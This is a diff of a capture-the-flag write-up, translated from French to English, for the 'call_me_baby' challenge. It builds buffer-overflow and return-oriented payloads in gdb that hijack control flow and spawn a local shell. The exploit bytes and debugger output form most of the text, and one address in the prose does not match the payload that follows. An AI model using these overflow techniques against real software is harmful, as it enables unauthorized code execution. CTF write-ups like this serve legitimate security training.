@@ -98,7 +98,7 @@ Breakpoint 2 at 0x40120a
 Now we'll input 64 characters using python to fill up local_48, and inspect the register to see how many bytes we need to write over before reaching the rbp :
 
 ```gdb
-(gdb) r <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*64)')
+(gdb) run <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*64)')
 Starting program: /home/coucou/Documents/CTF_SSI_2024/Call_me_baby/call_me_baby <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*64)')
 [Thread debugging using libthread_db enabled]
 Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
@@ -154,7 +154,7 @@ Non-debugging symbols:
 The address is : `0x000000000040118a`. Let's rewrite our payload, we'll need to input 64 characters to write over local_48, 8 characters to write over the rbp, and then give a pointer to the call_me() function (in reverse since we're on a [little endian system](https://en.wikipedia.org/wiki/Endianness)) :
 
 ```gdb
-(gdb) r <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*64+b"\x41"*8+b"\x8a\x11\x40\x00"+b"\x00"*4)')
+(gdb) run <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*64+b"\x41"*8+b"\x8a\x11\x40\x00"+b"\x00"*4)')
 The program being debugged has been started already.
 Start it from the beginning? (y or n) y
 Starting program: /home/coucou/Documents/CTF_SSI_2024/Call_me_baby/call_me_baby <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*64+b"\x41"*8+b"\x8a\x11\x40\x00"+b"\x00"*4)')
@@ -198,15 +198,18 @@ $ ROPgadget --binary call_me_baby | grep 'rdi'
 
 We found `pop rdi; ret` which is exaclty what we want : the `pop rdi` instruction will save the last value on the stack into rdi, and the `ret` instruction will redirect the program towards the next value on the stack.  
   
-Let's look at the instructions 
+Let's look at the gadget we found on gdb :
+  
 ```gdb
-(gdb) x/5wi 0x000000000040116a
+(gdb) x/2wi 0x000000000040116a
    0x40116a <gadgets+4>:	pop    %rdi
    0x40116b <gadgets+5>:	ret
-   0x40116c <gadgets+6>:	nop
-   0x40116d <gadgets+7>:	pop    %rbp
-   0x40116e <gadgets+8>:	ret
-(gdb) i func gadgets
+```
+
+Apparently those instrutions are part of the function gadgets() we saw earlier during our static analysis. Let's look further into this function :
+
+```gdb
+(gdb) info function gadgets
 all functions matching regular expression "gadgets":
 
 non-debugging symbols:
@@ -223,33 +226,20 @@ dump of assembler code for function gadgets:
 end of assembler dump.
 ```
 
-Ces instructions font partis de la fonction gadgets() qu'on a apperçue plus tôt lors du reverse. Elle va nous permettre de modifier rdi.  
+This function is pushing the rbp onto the stack, then poping the stack into the rdi. In other words, the value contained in the rbp will end up in the rdi.  
   
-On voit que la fonction push le rbp sur la stack, puis pop la stack dans rdi. Autrement dit la valeur contenu dans le rbp, va se retrouver dans le rdi. Il faut donc modifer le rbp avec la valeur que l'on veut mettre dans le rdi, puis rediriger le programme vers la fonction gadgets. Essayons un payload :
+So we need to overwrite the rbp with the value we want in the rdi, and then call the function gadgets(). Let's try a payload : 64 bytes to overwrite loacl_48, `baby` in hexadecimals (to be written over the rbp), and the pointer to the gadgets() function. Let's put a breakpoint at the function gadgets and see what's going on :
 
 ```gdb
-(gdb) i func gadgets
-all functions matching regular expression "gadgets":
-
-non-debugging symbols:
-0x0000000000401166  gadgets
 (gdb) break *gadgets
 breakpoint 4 at 0x401166
-(gdb) r <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*64+b"\x62\x61\x62\x79"+b"\x00"*4+b"\x66\x11\x40\x00"+b"\x00"*4)')
+(gdb) run <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*64+b"\x62\x61\x62\x79"+b"\x00"*4+b"\x66\x11\x40\x00"+b"\x00"*4)')
 the program being debugged has been started already.
 start it from the beginning? (y or n) y
 starting program: /home/coucou/documents/ctf_ssi_2024/call_me_baby/call_me_baby <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*64+b"\x62\x61\x62\x79"+b"\x00"*4+b"\x66\x11\x40\x00"+b"\x00"*4)')
 [thread debugging using libthread_db enabled]
 using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
-
-breakpoint 1, 0x00000000004011dd in vuln ()
-(gdb) c
-continuing.
 write your love letter: 
-
-breakpoint 2, 0x000000000040120a in vuln ()
-(gdb) c
-continuing.
 
 breakpoint 4, 0x0000000000401166 in gadgets ()
 (gdb) disas
@@ -262,9 +252,14 @@ dump of assembler code for function gadgets:
    0x000000000040116d <+7>:	pop    %rbp
    0x000000000040116e <+8>:	ret
 end of assembler dump.
+```
+
+We've successfully reached gadgets(). Let's add a breakpoint after the instruction `pop rdi` and check if the register is being modified :
+
+```gdb
 (gdb) break *gadgets+5
 breakpoint 5 at 0x40116b
-(gdb) i r
+(gdb) info register
 rax            0x51                81
 rbx            0x7fffffffdb38      140737488345912
 rcx            0x7ffff7ec0a5d      140737352829533
@@ -289,11 +284,11 @@ ds             0x0                 0
 es             0x0                 0
 fs             0x0                 0
 gs             0x0                 0
-(gdb) c
+(gdb) continue
 continuing.
 
 breakpoint 5, 0x000000000040116b in gadgets ()
-(gdb) i r
+(gdb) info register
 rax            0x51                81
 rbx            0x7fffffffdb38      140737488345912
 rcx            0x7ffff7ec0a5d      140737352829533
@@ -320,43 +315,23 @@ fs             0x0                 0
 gs             0x0                 0
 ```
 
-On voit dans le registre que le rdi est bien modifié.  
+Using the `info register` command to check the register, we can see that the rdi has been modified.
   
-Il faut maintenant ajouter un pointeur vers la fonction call_me pour qu'elle s'execute après gadgets :
+Now let's add a pointer to the call_me() function at the end of our payload, so that it's called after we modified the rdi :
 
 ```gdb
-(gdb) i func call_me
+(gdb) info function call_me
 all functions matching regular expression "call_me":
 
 non-debugging symbols:
 0x000000000040118a  call_me
-(gdb) r <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*64+b"\x62\x61\x62\x79"+b"\x00"*4+b"\x66\x11\x40\x00"+b"\x00"*4+b"\x8a\x11\x40\x00"+b"\x00"*4)')
+(gdb) run <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*64+b"\x62\x61\x62\x79"+b"\x00"*4+b"\x66\x11\x40\x00"+b"\x00"*4+b"\x8a\x11\x40\x00"+b"\x00"*4)')
 the program being debugged has been started already.
 start it from the beginning? (y or n) y
 starting program: /home/coucou/documents/ctf_ssi_2024/call_me_baby/call_me_baby <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*64+b"\x62\x61\x62\x79"+b"\x00"*4+b"\x66\x11\x40\x00"+b"\x00"*4+b"\x8a\x11\x40\x00"+b"\x00"*4)')
 [thread debugging using libthread_db enabled]
 using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
-
-breakpoint 1, 0x00000000004011dd in vuln ()
-(gdb) c
-continuing.
 write your love letter: 
-
-breakpoint 2, 0x000000000040120a in vuln ()
-(gdb) c
-continuing.
-
-breakpoint 4, 0x0000000000401166 in gadgets ()
-(gdb) c
-continuing.
-
-breakpoint 5, 0x000000000040116b in gadgets ()
-(gdb) c
-continuing.
-
-breakpoint 3, 0x000000000040118a in call_me ()
-(gdb) c
-continuing.
 process 6806 is executing new program: /usr/bin/dash
 error in re-setting breakpoint 1: no symbol table is loaded.  use the "file" command.
 error in re-setting breakpoint 2: no symbol table is loaded.  use the "file" command.
@@ -383,7 +358,7 @@ error in re-setting breakpoint 5: no symbol "gadgets" in current context.
 [inferior 1 (process 6806) exited normally]
 ```
 
-On arrive bien au message de succès. Testons le payload directement sur l'executable :
+Gdb is trying to run another process. Let's try our payload on the binary the same way we did on the previous challenge :
 
 ```bash
 $ (python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*64+b"\x62\x61\x62\x79"+b"\x00"*4+b"\x66\x11\x40\x00"+b"\x00"*4+b"\x8a\x11\x40\x00"+b"\x00"*4)' ; tee) | ./call_me_baby
@@ -394,11 +369,11 @@ ls
 README.md  call_me_baby  exploit.py
 ```
 
-Le shell c'est bien lancé, le payload final est donc `"\x41"*64+"\x62\x61\x62\x79"+"\x00"*4+"\x66\x11\x40\x00"+"\x00"*4+"\x8a\x11\x40\x00"+"\x00"*4`.
+We successfully opened a shell, so the final payload is : `"\x41"*64+"\x62\x61\x62\x79"+"\x00"*4+"\x66\x11\x40\x00"+"\x00"*4+"\x8a\x11\x40\x00"+"\x00"*4`.
 
 ## Solution 2
 
-Cherchons le pointeur vers l'instruction ouvrant un shell et injectons là après le rbp :
+We need to find the pointer to the instruction calling the execve() function. Let's disassemble the function call_me() in gdb to do so :
 
 ```gdb
 (gdb) disas call_me
@@ -427,14 +402,15 @@ Dump of assembler code for function call_me:
    0x00000000004011db <+81>:	leave
    0x00000000004011dc <+82>:	ret
 End of assembler dump.
-(gdb) r <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*72+b"\xb0\x11\x40\x00"+b"\x00"*4)')
+```
+
+We can see that the instruction is being called at the address `0x00000000004011c4`. Let's try a payload : 72 characters to overwrite local_48 and the rbp, followed by the pointer to the execve() function. 
+
+```gdb
+(gdb) run <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*72+b"\xb0\x11\x40\x00"+b"\x00"*4)')
 Starting program: /home/coucou/Documents/CTF_SSI_2024/Call_me_baby/call_me_baby <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*72+b"\xb0\x11\x40\x00"+b"\x00"*4)')
 [Thread debugging using libthread_db enabled]
 Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
-
-Breakpoint 1, 0x00000000004011dd in vuln ()
-(gdb) c
-Continuing.
 Write your love letter: 
 process 6977 is executing new program: /usr/bin/dash
 Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
@@ -450,7 +426,7 @@ Error in re-setting breakpoint 2: No symbol "call_me" in current context.
 [Inferior 1 (process 6977) exited normally]
 ```
 
-On arrive bien au message de succès. Testons le payload directement sur l'executable :
+Gdb is trying to start a new process. Let's try our payload on the binary :
 
 ```bash
 $ (python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*72+b"\xb0\x11\x40\x00"+b"\x00"*4)' ; tee) | ./call_me_baby 
@@ -461,11 +437,11 @@ ls
 README.md  call_me_baby  exploit1.py  exploit2.py
 ```
 
-Le shell c'est bien lancé, le payload final est donc `"\x41"*72+"\xb0\x11\x40\x00"+"\x00"*4`.
+We successfully got a shell, so our final payload is : `"\x41"*72+"\xb0\x11\x40\x00"+"\x00"*4`.
 
 # Exploit
 
-De la même manière que le chall précedent, on utilise des scripts python pour se connecter, envoyer le payload, et interagir avec le shell.
+Same as before, let's use some python scripts to send our payload.
 
 ## Exploit 1
 
